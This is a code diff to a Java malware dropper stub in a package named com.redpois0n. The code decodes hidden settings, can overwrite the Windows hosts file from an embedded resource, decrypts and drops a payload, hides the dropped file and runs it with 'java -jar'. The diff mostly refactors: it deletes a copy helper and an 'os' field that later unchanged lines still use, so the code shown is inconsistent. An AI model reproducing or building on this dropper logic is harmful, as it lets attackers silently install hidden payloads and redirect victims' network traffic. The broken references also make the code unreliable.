@@ -1,4 +1,5 @@
 package com.redpois0n;
+
 import java.awt.Desktop;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -8,7 +9,6 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.io.Reader;
 import java.security.Key;
 import java.util.Random;
@@ -22,25 +22,12 @@ import javax.swing.UIManager;
 public class Main {
 
 	public static final byte[] buffer = new byte[1024];
-	public static final String os = System.getProperty("os.name").toLowerCase();
 	public static final String userHome = System.getProperty("user.home");
-
-	public static void copy(InputStream input, OutputStream output, boolean close) throws Exception {
-		int bytesRead;
-		while ((bytesRead = input.read(buffer)) != -1) {
-			output.write(buffer, 0, bytesRead);
-		}
-		if (close) {
-			input.close();
-			output.close();
-		}
-	}
 
 	@SuppressWarnings("resource")
 	public static void main(String[] args) {
 		try {
-
-			if (os.contains("mac")) {
+			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 				System.setProperty("apple.awt.UIElement", "true");
 			}
 
@@ -51,7 +38,7 @@ public class Main {
 			String encryptionKey = decode(keyArgs[0].trim());
 			String dropLocation = decode(keyArgs[1].trim());
 			String dropFileName = decode(keyArgs[2].trim());
-			
+
 			boolean hidden = Boolean.parseBoolean(decode(keyArgs[10].trim()));
 
 			if (decode(keyArgs[8]).equalsIgnoreCase("true")) {
@@ -63,18 +50,18 @@ public class Main {
 					File file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
 
 					BufferedReader reader = new BufferedReader(new InputStreamReader(Main.class.getResourceAsStream("/host.dat")));
-					
+
 					boolean overwrite = Boolean.parseBoolean(decode(reader.readLine()));
-					
+
 					FileWriter writer = new FileWriter(file, overwrite);
 					BufferedWriter out = new BufferedWriter(writer);
-					
+
 					String host = "";
 					String line;
 					while ((line = reader.readLine()) != null) {
 						host += line + "\n";
 					}
-					
+
 					out.write(decode(host));
 
 					out.close();
@@ -83,7 +70,7 @@ public class Main {
 					ex.printStackTrace();
 				}
 			}
-			
+
 			if (hidden && !os.contains("win")) {
 				dropFileName = "." + dropFileName;
 			}
@@ -118,7 +105,7 @@ public class Main {
 				out.write(buffer, 0, numRead);
 			}
 			out.close();
-			
+
 			if (hidden && os.contains("win")) {
 				Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
 			}
@@ -188,7 +175,7 @@ public class Main {
 				} else {
 					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
 				}
-			} 
+			}
 			if (decode(keyArgs[4]).equalsIgnoreCase("true")) {
 				try {
 					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
@@ -237,7 +224,7 @@ public class Main {
 
 		return new String(out);
 	}
-	
+
 	private static int toDigit(char ch, int index) throws Exception {
 		int digit = Character.digit(ch, 16);
 		if (digit == -1) {
